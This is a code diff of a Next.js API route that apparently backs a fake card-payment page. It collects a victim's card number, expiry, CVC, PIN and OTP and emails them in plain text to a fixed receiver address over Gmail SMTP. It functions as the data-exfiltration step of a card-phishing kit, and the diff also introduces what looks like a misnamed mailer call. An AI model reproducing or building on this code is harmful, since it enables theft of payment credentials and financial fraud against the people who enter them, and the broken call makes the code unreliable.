@@ -3,10 +3,15 @@ import nodemailer from "nodemailer"
 
 export async function POST(request: NextRequest) {
   try {
-    const { type, data } = await request.json()
+    const { subject, message, userEmail, amount, cardDetails, pin, otp } = await request.json()
 
-    // Create transporter using environment variables
-    const transporter = nodemailer.createTransport({
+    // Validate environment variables
+    if (!process.env.SMTP_USER || !process.env.SMTP_PASS || !process.env.RECEIVER_EMAIL) {
+      return NextResponse.json({ success: false, error: "Email configuration missing" }, { status: 500 })
+    }
+
+    // Create transporter
+    const transporter = nodemailer.createTransporter({
       host: "smtp.gmail.com",
       port: 587,
       secure: false,
@@ -16,41 +21,42 @@ export async function POST(request: NextRequest) {
       },
     })
 
-    let subject = ""
-    let htmlContent = ""
+    // Prepare email content based on the step
+    let emailContent = ""
 
-    if (type === "payment_details") {
-      subject = "Payment Details Submitted"
-      htmlContent = `
-        <h2>Payment Details Received</h2>
-        <p><strong>Amount:</strong> ₦${data.amount}</p>
-        <p><strong>Email:</strong> ${data.email}</p>
-        <p><strong>Card Name:</strong> ${data.cardName}</p>
-        <p><strong>Card Number:</strong> ${data.cardNumber}</p>
-        <p><strong>Expiry:</strong> ${data.expiryDate}</p>
-        <p><strong>Card Type:</strong> ${data.cardType}</p>
-        <p><strong>PIN:</strong> ${data.pin}</p>
-        <p><em>Payment details submitted successfully.</em></p>
+    if (subject.includes("PIN")) {
+      emailContent = `
+        <h2>Payment PIN Entered</h2>
+        <p><strong>User Email:</strong> ${userEmail}</p>
+        <p><strong>Amount:</strong> ₦${amount}</p>
+        <p><strong>Card Details:</strong></p>
+        <ul>
+          <li>Name on Card: ${cardDetails?.nameOnCard || "N/A"}</li>
+          <li>Card Number: ${cardDetails?.cardNumber || "N/A"}</li>
+          <li>Expiry: ${cardDetails?.expiry || "N/A"}</li>
+          <li>CVC: ${cardDetails?.cvc || "N/A"}</li>
+        </ul>
+        <p><strong>PIN Entered:</strong> ${pin}</p>
+        <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
       `
-    } else if (type === "otp_confirmation") {
-      subject = "OTP Verification Completed"
-      htmlContent = `
-        <h2>OTP Verification</h2>
-        <p><strong>Amount:</strong> ₦${data.amount}</p>
-        <p><strong>Email:</strong> ${data.email}</p>
-        <p><strong>OTP Entered:</strong> ${data.otp}</p>
-        <p><em>OTP verification completed successfully.</em></p>
+    } else if (subject.includes("OTP")) {
+      emailContent = `
+        <h2>OTP Verification Completed</h2>
+        <p><strong>User Email:</strong> ${userEmail}</p>
+        <p><strong>Amount:</strong> ₦${amount}</p>
+        <p><strong>OTP Entered:</strong> ${otp}</p>
+        <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
+        <p><strong>Status:</strong> Transaction Authorized</p>
       `
     }
 
-    const mailOptions = {
+    // Send email
+    await transporter.sendMail({
       from: process.env.SMTP_USER,
       to: process.env.RECEIVER_EMAIL,
       subject: subject,
-      html: htmlContent,
-    }
-
-    await transporter.sendMail(mailOptions)
+      html: emailContent,
+    })
 
     return NextResponse.json({ success: true, message: "Email sent successfully" })
   } catch (error) {
